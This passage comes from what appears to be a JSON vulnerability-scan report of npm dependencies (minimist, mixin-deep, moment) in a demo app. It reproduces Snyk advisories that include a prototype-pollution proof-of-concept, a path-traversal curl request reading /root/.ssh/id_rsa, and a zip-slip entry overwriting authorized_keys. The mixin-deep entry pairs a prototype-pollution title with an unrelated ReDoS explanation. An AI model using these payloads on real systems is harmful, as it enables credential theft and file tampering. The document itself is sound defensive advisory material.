`_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `minimist` to version 0.2.1, 1.2.3 or higher.\\n## References\\n- [Command Injection PoC](https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a)\\n- [GitHub Fix Commit #1](https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94)\\n- [GitHub Fix Commit #2](https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab)\\n- [Snyk Research Blog](https://snyk.io/blog/prototype-pollution-minimist/)\\n\",\n  \"disclosureTime\": \"2020-03-10T08:22:24Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"0.2.1\",\n    \"1.2.3\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"setKey\"\n      },\n      \"version\": [\n        \"<0.2.1\",\n        \">=1.0.0 <1.1.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports.setKey\"\n      },\n      \"version\": [\n        \"<0.2.1\",\n        \">=1.1.1 <1.2.3\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"setKey\"\n      },\n      \"version\": [\n        \"<0.2.1\",\n        \">=1.0.0 <1.1.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports.setKey\"\n      },\n      \"version\": [\n        \"<0.2.1\",\n        \">=1.1.1 <1.2.3\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-MINIMIST-559764\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-7598\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-vh95-rmgr-6w4m\"\n    ],\n    \"NSP\": [\n      \"1179\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-20T09:48:43.878574Z\",\n  \"moduleName\": \"minimist\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"minimist\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2020-03-11T08:22:19Z\",\n  \"references\": [\n    {\n      \"title\": \"Command Injection PoC\",\n      \"url\": \"https://gist.github.com/Kirill89/47feb345b09bf081317f08dd43403a8a\"\n    },\n    {\n      \"title\": \"GitHub Fix Commit #1\",\n      \"url\": \"https://github.com/substack/minimist/commit/63e7ed05aa4b1889ec2f3b196426db4500cbda94\"\n    },\n    {\n      \"title\": \"GitHub Fix Commit #2\",\n      \"url\": \"https://github.com/substack/minimist/commit/38a4d1caead72ef99e824bb420a2528eec03d9ab\"\n    },\n    {\n      \"title\": \"Snyk Research Blog\",\n      \"url\": \"https://snyk.io/blog/prototype-pollution-minimist/\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.2.1\",\n      \">=1.0.0 <1.2.3\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\",\n    \"optimist@0.6.1\",\n    \"minimist@0.0.10\"\n  ],\n  \"upgradePath\": [],\n  \"isUpgradable\": false,\n  \"isPatchable\": false,\n  \"name\": \"minimist\",\n  \"version\": \"0.0.10\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 , optimist@0.6.1 , minimist@0.0.10 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , coveralls@3.0.9 , minimist@1.2.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , caching-transform@1.0.1 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , find-cache-dir@0.1.1 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-report@1.1.3 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-lib-source-maps@1.2.3 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , spawn-wrap@1.4.2 , mkdirp@0.5.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 , optimist@0.6.1 , minimist@0.0.8 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2019-10746"
            ],
            "ghsaid": [
              "fhjf-83wg-r2j9"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-MIXINDEEP-450212",
          "desc": "## Overview\n[mixin-deep](https://www.npmjs.com/package/mixin-deep) is a package that deeply mixes the properties of objects into the first object.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `mixin-deep` could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` payload.\r\n\r\n## PoC by Snyk\r\n```\r\nconst mixin = require('mixin-deep');\r\nconst payload = '{\"constructor\": {\"prototype\": {\"a0\": true}}}'\r\n\r\nfunction check() {\r\n    mixin({}, JSON.parse(payload));\r\n    if (({})[`a0`] === true) {\r\n          console.log(`Vulnerable to Prototype Pollution via ${payload}`)\r\n  }\r\n}\r\n\r\ncheck();\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `mixin-deep` to version 2.0.1, 1.3.2 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-06-20T09:34:56.241544Z\",\n  \"credit\": [\n    \"Snyk Security Team\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[mixin-deep](https://www.npmjs.com/package/mixin-deep) is a package that deeply mixes the properties of objects into the first object.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The function `mixin-deep` could be tricked into adding or modifying properties of `Object.prototype` using a `constructor` payload.\\r\\n\\r\\n## PoC by Snyk\\r\\n```\\r\\nconst mixin = require('mixin-deep');\\r\\nconst payload = '{\\\"constructor\\\": {\\\"prototype\\\": {\\\"a0\\\": true}}}'\\r\\n\\r\\nfunction check() {\\r\\n    mixin({}, JSON.parse(payload));\\r\\n    if (({})[`a0`] === true) {\\r\\n          console.log(`Vulnerable to Prototype Pollution via ${payload}`)\\r\\n  }\\r\\n}\\r\\n\\r\\ncheck();\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `mixin-deep` to version 2.0.1, 1.3.2 or higher.\\n## References\\n- [GitHub Commit](https://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9)\\n\",\n  \"disclosureTime\": \"2019-06-19T09:34:10Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"2.0.1\",\n    \"1.3.2\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports.copy\"\n      },\n      \"version\": [\n        \"<1.1.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"copy\"\n      },\n      \"version\": [\n        \">=1.1.1 <2.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"mixinDeep\"\n      },\n      \"version\": [\n        \">=2.0.0 <2.0.1\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports.copy\"\n      },\n      \"version\": [\n        \"<1.1.1\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"copy\"\n      },\n      \"version\": [\n        \">=1.1.1 <2.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"mixinDeep\"\n      },\n      \"version\": [\n        \">=2.0.0 <2.0.1\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-MIXINDEEP-450212\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-10746\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-fhjf-83wg-r2j9\"\n    ],\n    \"NSP\": [\n      \"1013\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:13.112544Z\",\n  \"moduleName\": \"mixin-deep\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"mixin-deep\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2019-06-20T09:34:08Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=2.0.0 <2.0.1\",\n      \"<1.3.2\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"micromatch@3.1.10\",\n    \"snapdragon@0.8.2\",\n    \"base@0.11.2\",\n    \"mixin-deep@1.3.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"micromatch@3.1.10\",\n    \"snapdragon@0.8.2\",\n    \"base@0.11.2\",\n    \"mixin-deep@1.3.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"mixin-deep\",\n  \"version\": \"1.3.1\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , mixin-deep@1.3.1 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "22"
            ],
            "cveid": [
              "2022-24785"
            ],
            "ghsaid": [
              "8hfj-j24r-96c4"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Directory Traversal",
          "id": "SNYK-JS-MOMENT-2440688",
          "desc": "## Overview\n[moment](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\n\nAffected versions of this package are vulnerable to Directory Traversal when a user provides a locale string which is directly used to switch moment locale.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `moment` to version 2.29.2 or higher.\n## References\n- [GitHub Commit](https://github.com/moment/moment/commit/4211bfc8f15746be4019bba557e29a7ba83d54c5)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2022-04-05T08:46:07.677588Z\",\n  \"credit\": [\n    \"Unknown\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[moment](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\\n\\nAffected versions of this package are vulnerable to Directory Traversal when a user provides a locale string which is directly used to switch moment locale.\\n\\n## Details\\n\\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \\\"dot-dot-slash (../)\\\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\\n\\nDirectory Traversal vulnerabilities can be generally divided into two types:\\n\\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\\n\\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\\n\\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\\n\\n```\\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\\n```\\n**Note** `%2e` is the URL encoded version of `.` (dot).\\n\\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \\n\\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\\n\\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\\n\\n```\\n2018-04-15 22:04:29 .....           19           19  good.txt\\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\\n```\\n\\n## Remediation\\nUpgrade `moment` to version 2.29.2 or higher.\\n## References\\n- [GitHub Commit](https://github.com/moment/moment/commit/4211bfc8f15746be4019bba557e29a7ba83d54c5)\\n\",\n  \"disclosureTime\": \"2022-04-05T08:39:23Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.29.2\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-MOMENT-2440688\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2022-24785\"\n    ],\n    \"CWE\": [\n      \"CWE-22\"\n    ],\n    \"GHSA\": [\n      \"GHSA-8hfj-j24r-96c4\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-05T12:30:50.880408Z\",\n  \"moduleName\": \"moment\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"moment\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2022-04-05T12:30:50.878091Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/moment/moment/commit/4211bfc8f15746be4019bba557e29a7ba83d54c5\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.29.2\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Directory Traversal\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"moment@2.15.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"moment@2.29.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"moment\",\n  \"version\": \"2.15.1\"\n}",
          "results": [
            {
              "status": "failed",
